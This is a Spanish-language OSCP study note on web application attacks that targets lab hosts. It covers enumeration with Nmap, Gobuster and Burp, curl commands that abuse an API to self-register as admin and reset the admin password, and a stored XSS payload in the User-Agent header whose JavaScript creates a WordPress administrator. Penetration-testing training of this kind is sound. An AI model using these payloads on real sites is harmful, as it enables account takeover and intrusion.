---
tipo: modulo
modulo: 8
estado: repasado
tags:
  - oscp
  - enumeracion
  - explotacion
  - linux
fecha: 2026-09-28
---

# 08 - Introduction to Web Application Attacks

> [!abstract] Resumen
> Introducción al ataque de aplicaciones web. Las apps modernas exponen una **superficie de ataque enorme** (muchas dependencias, malas configuraciones, código inmaduro y fallos de lógica de negocio). Muchas vulns son **agnósticas a la tecnología**, así que las mismas vías de explotación sirven en distintos stacks.
> Cubre: **metodología** de assessment (white/grey/black-box, OWASP Top 10), **herramientas** (Nmap, Wappalyzer, Gobuster y sobre todo **Burp Suite**), **enumeración** de la app (debugging en el navegador, headers, sitemaps y abuso de **APIs REST**) y la primera vuln de explotación: **Cross-Site Scripting (XSS)** hasta privesc creando un admin en WordPress.

## Conceptos clave
- **White-box**: acceso total a código fuente, infra y diseño. Requiere revisar código y lógica; más lento según el tamaño.
- **Black-box** (zero-knowledge): sin información previa → mucho peso en la fase de **enumeración**. Típico de bug bounty. **Este módulo es black-box.**
- **Grey-box**: información limitada (credenciales, método de auth, detalles del framework).
- **OWASP Top 10**: lista periódica de los riesgos más críticos en apps web (OWASP Foundation). Base para construir ataques más avanzados.
- **Stack tecnológico** = SO host + servidor web + base de datos + lenguaje frontend/backend. Identificarlo **antes** de atacar: algunos payloads dependen de la BD o del SO.
- **Web proxy**: intercepta requests/responses entre cliente y servidor para verlos y modificarlos (Burp). Permite enviar input arbitrario que la app no espera.
- **REST API**: interfaz que interactúa con la lógica de backend; en black-box hay que **descubrirla** (fuzzing) al no tener documentación.
- **XSS**: inyección de código cliente (JS) que abusa de la confianza del usuario en el sitio; se ejecuta en el **navegador de la víctima**, no en el servidor.

> [!tip] Idea para el examen
> El flujo web del examen es casi siempre: **fingerprint del stack → enumeración (dirs/ficheros/APIs/headers/source) → identificar input no saneado → explotar**. Burp (Proxy + Repeater + Intruder) es la herramienta central; ten `/etc/hosts` configurado con el hostname del target. Cuando veas un formulario o header reflejado, prueba `< > ' " { } ;` para detectar XSS. En APIs, prueba cambiar el **método HTTP** (GET→POST/PUT) y busca fallos de lógica en el **registro** (parámetros ocultos como `admin:true`).

---

## 8.1 Metodología de assessment web

Tres enfoques según la información/scope: **white-box**, **grey-box** y **black-box** (ver Conceptos clave). Este módulo trabaja en black-box para forjar las skills de enumeración. Los ataques que se muestran corresponden a vulns comunes del **OWASP Top 10**; entenderlas es la base para ataques más avanzados en módulos posteriores.

---

## 8.2 Herramientas de assessment web

### Fingerprinting del servidor web con Nmap
Empezar siempre por el **servidor web**, denominador común de cualquier app. Detección de versión y luego scripts NSE de HTTP:

```bash
sudo nmap -p80 -sV 192.168.50.20                    # banner/versión del servidor web
sudo nmap -p80 --script=http-enum 192.168.50.20     # fingerprint inicial: dirs/ficheros típicos
```
`http-enum` reveló `/login.php`, `/db/`, `/css/`, `/images/`, `/js/`, `/uploads/` → pistas de la app.

### Identificar el stack con Wappalyzer
Servicio online (registro gratis) → **Technology Lookup** sobre un dominio. Análisis **pasivo** que revela SO, framework UI, servidor web, CDN, fuentes y **librerías JS**. En `megacorpone.com`: Debian, Bootstrap, Apache, Google Hosted Libraries, Font Awesome, jQuery/prettyPhoto/Modernizr.

> [!tip] Las versiones de librerías JS pueden ser vulnerables. Anota versiones concretas (ej. jQuery x.y.z) para buscar CVEs.

### Directory brute force con Gobuster
Descubre paths ocultos por diccionario. Modo `dir` (ficheros/directorios):

```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```
| Flag | Qué hace |
|---|---|
| `dir` | Modo enumeración de dirs/ficheros (hay también `dns`, `fuzz`) |
| `-u` | URL/IP objetivo |
| `-w` | Wordlist |
| `-t` | Nº de threads (defecto 10; bajarlo = menos ruido/tráfico) |

Status típicos: **301** redirect a directorio, **403** sin permisos (existe pero no accesible), **302** redirect (ej. `index.php`→`login.php`), **200** accesible.

> [!warning] Gobuster es **ruidoso** por naturaleza (brute force) → poco apto para engagements sigilosos.

### Burp Suite
Plataforma GUI de testing web. La **Community Edition** cubre testing manual; las de pago añaden scanner. Se lanza desde `Applications > 03 Web Application Analysis` o por terminal:

```bash
burpsuite
```
Al abrir: elegir **Temporary project** → **Use Burp defaults** → *Start Burp*. Las 4 primeras panes son resumen del scanner Pro (ignorar); trabajar con las pestañas de arriba.

**Proxy** — intercepta requests antes de enviarlas al servidor; permite modificar parámetros, valores de formulario y añadir headers.
- Desactivar **Intercept** para navegar cómodo (con Intercept ON hay que **Forward** cada request, o **Drop** para descartarla).
- Listener por defecto en `localhost:8080` (Proxy > Options).
- Configurar Firefox (`about:preferences#general` → Network Settings → **Manual**): IP `127.0.0.1`, puerto `8080`, y marcar el proxy para **todos los protocolos**.
- Tráfico capturado en **Proxy > HTTP History**; al clicar una request se ve request (izq) y response (der).

> [!tip] Quitar ruido de `detectportal.firefox.com` (captive portal): `about:config` → `network.captive-portal-service.enabled` = **false**. Si el navegador se cuelga cargando, casi seguro Intercept está ON.

**Repeater** — reenviar y modificar requests manualmente. Botón derecho sobre una request → **Send to Repeater** → editar → **Send** → ver la response cruda.

**Intruder** — automatiza ataques (ej. brute force de password). Flujo del lab (WordPress `offsecwp`):
1. Configurar `/etc/hosts` con el hostname (`192.168.50.16 offsecwp`) para resolver sin DNS.
2. Login de prueba en `wp-login.php` → interceptar el POST → **Send to Intruder**.
3. **Positions**: *Clear*, marcar solo el valor de `pwd` → *Add* (solo se fuzzea la password).
4. **Payloads**: pegar wordlist (ej. primeras 10 de rockyou).
5. **Start Attack** → la request con **status distinto** (302 vs 200) delata la password correcta.

```bash
cat /usr/share/wordlists/rockyou.txt | head    # primeras 10 entradas para la lista simple
```

> [!warning] Si Firefox usa Burp como proxy y cierras Burp, Firefox deja de navegar (no hay proxy escuchando).

---

## 8.3 Enumeración de la aplicación web

Identificar los componentes antes de atacar. Muchas vulns son agnósticas, pero payloads/exploits dependen del stack (BD, SO). Las **Developer Tools** del navegador (Firefox en Kali) son clave.

### Debugging del contenido de la página
- La **URL** y extensiones dan pistas del lenguaje (`.php`, o `.jsp/.do` en Java). Con **rutas (routes)** las extensiones son cada vez menos relevantes.
- **Debugger** (Web Developer): muestra recursos, JS frameworks, campos ocultos, comentarios y controles cliente. Botón **Pretty print** (`{}`) para "desminificar" JS (ej. jQuery 3.6.0).
- **Inspector**: botón derecho en un elemento → *Inspect* → resalta su HTML. Útil para **campos de formulario ocultos**.

### Inspeccionar headers de respuesta y sitemaps
- **Network tool** (Web Developer): refrescar la página para ver el tráfico; clicar una request → **response headers**.
- El header **Server** suele revelar el software (y a veces versión). Headers no estándar delatan el stack: `X-Powered-By`, `X-Aspnet-Version`, `x-amz-cf-id` (→ Amazon CloudFront).

> [!tip] Los "X-" ya no son "no estándar" oficialmente (RFC6648 desaconseja el prefijo). Algunos headers los añaden proxies, no el servidor (ej. `X-Forwarded-For` con la IP original del cliente).

- **Sitemaps / robots.txt**: `robots.txt` **excluye** URLs del crawling (a menudo justo las páginas sensibles/admin que nos interesan); los sitemaps las **incluyen** para indexar.

```bash
curl https://www.google.com/robots.txt    # ver directivas Allow/Disallow
```

### Enumerar y abusar de APIs (REST)
En apps closed-source internas, las **APIs REST** exponen la lógica de backend. En black-box hay que descubrirlas por brute force. Los paths suelen seguir `/<api_name>/v1`, `/<api_name>/v2`.

Gobuster con **patterns** (`-p`): un fichero con placeholders `{GOBUSTER}` que añaden el sufijo de versión a cada palabra:

```bash
# pattern (fichero):
#   {GOBUSTER}/v1
#   {GOBUSTER}/v2
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
| Parte | Qué hace |
|---|---|
| `-p pattern` | Fichero de patrones con placeholder `{GOBUSTER}` |
| `{GOBUSTER}` | Se sustituye por cada palabra de la wordlist |

Encontró `/books/v1` y `/users/v1`. (Si existe `/ui`, suele contener la **documentación** completa — lujo raro en black-box.)

**Explotación por lógica (privesc en la API):**

```bash
curl -i http://192.168.50.16:5002/users/v1                      # lista usuarios (incluye admin)
gobuster dir -u http://.../users/v1/admin/ -w .../small.txt     # descubre subpaths: /email /password
curl -i http://.../users/v1/admin/password                      # 405 Method Not Allowed -> el path existe
curl -i http://.../users/v1/login                               # 404 pero "User not found" -> la API existe
# login con user conocido + pass dummy: confirma el formato de parámetros
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://.../users/v1/login
# registro: falla pidiendo email -> reintentar añadiendo el parámetro oculto admin:True
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
     -H 'Content-Type: application/json' http://.../users/v1/register
# login con el nuevo usuario -> devuelve un JWT (auth_token)
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json' http://.../users/v1/login
# cambiar la password del admin usando el token; POST da 405 -> probar PUT
curl -X 'PUT' 'http://.../users/v1/admin/password' \
     -H 'Content-Type: application/json' \
     -H 'Authorization: OAuth <JWT>' \
     -d '{"password": "pwned"}'
# verificar: login como admin con la nueva password
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json' http://.../users/v1/login
```
| Idea | Detalle |
|---|---|
| **405 vs 404** | 405 = el path existe pero el método no está permitido → prueba otro método |
| **GET→POST/PUT** | curl usa GET por defecto; POST crea, **PUT/PATCH** reemplazan valores |
| **Parámetro oculto** | `admin:True` en el registro = fallo de lógica → auto-registro como admin |
| **JWT** | Token de auth devuelto al hacer login; se pasa en `Authorization` |

> [!important] La toma del admin salió de un **fallo de lógica** (privilege escalation) en la API de registro, no de un CVE. Estos bugs abundan en APIs custom por falta de testing y de secure coding.

> [!tip] Escalar con Burp: añadir `--proxy 127.0.0.1:8080` a curl para mandar la request a Burp, y desde **Repeater** recrearla. **Target > Site map** guarda todo el mapa de APIs probadas para reenviarlas a Repeater/Intruder.

---

## 8.4 Cross-Site Scripting (XSS)

La **sanitización** de datos (eliminar/transformar caracteres peligrosos) es la defensa clave. Sin ella se puede **inyectar y ejecutar** código. XSS inyecta contenido (JS) en la página que renderiza el navegador de **otro usuario**. Detalle completo en [[Cross-Site Scripting (XSS)]].

### Tipos (teoría)
- **Stored (Persistent)**: el payload se **guarda** (BD/caché) y se sirve a todo el que visite la página vulnerable → afecta a **todos** los usuarios. Típico en foros, comentarios, reviews.
- **Reflected**: el payload va en la request/enlace y se **refleja** en la respuesta → afecta **solo** a quien envía la request. Típico en buscadores y mensajes de error.
- **DOM-based**: ocurre **solo** en el DOM del navegador cuando se modifica con valores controlados por el usuario. Puede ser stored o reflected.

En todos los casos el script corre en el **contexto del usuario que visita** la página (su navegador, no el servidor): session hijacking, redirecciones, ejecución de apps locales, trojanizar la app.

### Identificar XSS
Buscar inputs (buscadores, formularios, headers) cuyo valor aparezca reflejado sin filtrar. Probar caracteres especiales y ver si vuelven sin codificar:

```
< > ' " { } ;
```
`< >` = tags HTML; `{ }` = funciones JS; `' "` = strings; `;` = fin de sentencia. Si la app **no** los codifica (ej. `&lt;` para `<`), los interpreta como código. El set necesario depende de **dónde** cae el input (entre `<div>` necesitas `<script>`; dentro de un `<script>` existente basta con comillas y `;`).

### XSS básico (WordPress plugin *Visitors*, stored)
El plugin guarda el header **User-Agent** sin sanear y lo pinta en un `<td>` cuando el admin abre el dashboard → **stored XSS** por header.

1. Burp Proxy (Intercept OFF) → navegar a `http://offsecwp/` → **Send to Repeater**.
2. En Repeater sustituir el `User-Agent` por `<script>alert(42)</script>` → **Send** (200 OK = payload guardado).
3. Login admin (`admin`/`password`) y abrir el plugin:
   `http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php` → salta el `alert(42)`.

> [!example] La misma vuln se habría hallado en black-box haciendo **fuzzing de headers HTTP**, sin ver el código.

### Privesc vía XSS: crear un admin de WordPress
Las cookies de sesión de WP tienen flag **HttpOnly** (JS no puede leerlas) → robar cookie no sirve aquí. Alternativa: que el JS ejecutado por el admin **cree otro usuario admin**.

> [!info] Flags de cookie relevantes: **Secure** (solo se envía por HTTPS) y **HttpOnly** (JS no puede accederla). Sin HttpOnly, un XSS puede robar la cookie. Comprobar en DevTools > Storage > Cookies.

WP usa un **nonce** (token anti-**CSRF**) en cada acción admin. Un ataque **CSRF** engaña a la víctima autenticada para que ejecute una acción con un enlace malicioso; el nonce lo previene porque el atacante no lo conoce de antemano. Pero con el **stored XSS** el JS corre en el contexto del admin → puede **leer el nonce** de la página y luego usarlo:

```javascript
// 1) Obtener el nonce desde /wp-admin/user-new.php
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// 2) Crear el usuario administrador con el nonce
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

Para meterlo en el User-Agent hay que **minificar** (JS Compress) y luego **codificar** a `String.fromCharCode(...)` para evitar bad characters, ejecutándolo con `eval()`:

```javascript
// Convierte cada carácter del JS minificado a su código UTF-16 (charCodeAt)
function encode_to_javascript(string) {
    var input = string;
    var output = '';
    for (pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if (pos != (input.length - 1)) { output += ","; }
    }
    return output;
}
let encoded = encode_to_javascript('insert_minified_javascript');
console.log(encoded);
```

Lanzar el payload como User-Agent (a través de Burp para inspeccionarlo):

```bash
curl -i http://offsecwp \
  --user-agent "<script>eval(String.fromCharCode(118,97,114,...))</script>" \
  --proxy 127.0.0.1:8080
```
Forward en Burp → login como admin → abrir el plugin Visitors (ejecuta el JS) → en **Users** aparece el nuevo admin `attacker`. El siguiente paso (otro módulo) sería subir un **plugin con web shell** para RCE en el host.

> [!warning] En el dashboard el registro sale con User-Agent vacío: el navegador no puede renderizar el texto dentro de `<script>`, pero el script **sí se ejecuta**.

---

## Ejemplo práctico
> [!example] Flujo web black-box del módulo
> 1. **Fingerprint**: `nmap -sV` + `--script=http-enum`; Wappalyzer para el stack; anotar versiones de librerías JS.
> 2. **Enumerar**: `gobuster dir` (dirs/ficheros), DevTools (source, campos ocultos), headers (`Server`, `X-Powered-By`), `robots.txt`.
> 3. **APIs**: `gobuster -p pattern` para `/name/vN`; jugar con métodos HTTP (405/404), abusar de registro (`admin:True`), obtener JWT, `PUT` para cambiar la password.
> 4. **XSS**: probar `< > ' " { } ;` en inputs/headers; stored XSS por User-Agent (`<script>alert(42)</script>`); escalar creando un admin de WP (nonce + `eval(String.fromCharCode(...))`).

## Relacionado
- Técnicas: [[Cross-Site Scripting (XSS)]] · [[API Enumeration]]
- Cheatsheet: [[Web]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - ¿Cómo se automatiza en Burp Intruder el ataque a la API (fuzzear el `admin:True` u otros parámetros ocultos)?
> - Práctica pendiente: crear el plugin de WordPress con web shell para pasar de admin a RCE en el host.
> - Repasar cómo detectar DOM-based XSS (no se cubre en detalle aquí).
